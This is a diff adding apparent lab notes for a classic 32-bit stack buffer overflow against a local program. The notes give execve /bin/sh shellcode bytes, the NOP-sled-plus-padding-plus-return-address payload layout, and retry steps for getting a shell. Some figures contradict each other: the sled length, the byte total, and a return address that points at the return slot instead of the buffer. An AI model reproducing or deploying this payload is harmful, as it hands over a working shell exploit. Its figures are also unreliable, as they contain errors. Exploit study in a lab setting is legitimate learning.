@@ -1,0 +1,37 @@
+
+ret=0xffffc96c [$ret=0x080491ce] -----> 
+ebp=0xffffc968 [$ebp=0xffffc988]                [4 byte]
+alignment addresses = 0xffffc9b0, 0xffffc9b4    [8 byte]
+local variable &buffer=0xffffc8fc - 0xffffc95f  [100 byte]
+
+
+to overwrite ret we need total 112 bytes.
+
+shellcode=
+    [NOP slide]
+    [Exploit]
+    [Padding]   // incase shellcode size is not enough to fill the buffer
+    [eip such that ret addr points to NOP slide]
+
+33 byte shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
+buffer address=0xffffc8fc [NOP slide starts from here so eip shoud point to this]
+
+let's take 31 byte NOP slide. [NOP=\x90]
+    NOP='\x90'*32
+
+we have covered 64 byte, now let's do some padding before altering ret addr:
+    padding=total_byte - shellcode - NOP = 112 - 33 - 32 = 47
+    padding='A'*47
+
+by now we have overflowed till ebp, the next location is for saved return address that should point to somewhere in NOP slide [eip=buffer start]:
+    eip='\x6c\xc9\xff\xff'  this can be found by examining the stack frame as this depends on the size of the input to the main (i.e. shell code)
+    
+-------------------------------------------------------------------------------------------------
+payload=NOP+shellcode+padding+eip
+
+
+----------------------executing exploit outside debugger----------------------
+step 1: Guess the eip (put addresses near to one found in GDB)      [needed because due to difference in environment variable of GDB and terminal the stack changes]
+step 2: execute the file with payload 
+        ./example $(./findPayload.py)
+step 3: if shell is not returned "Go to step 1"
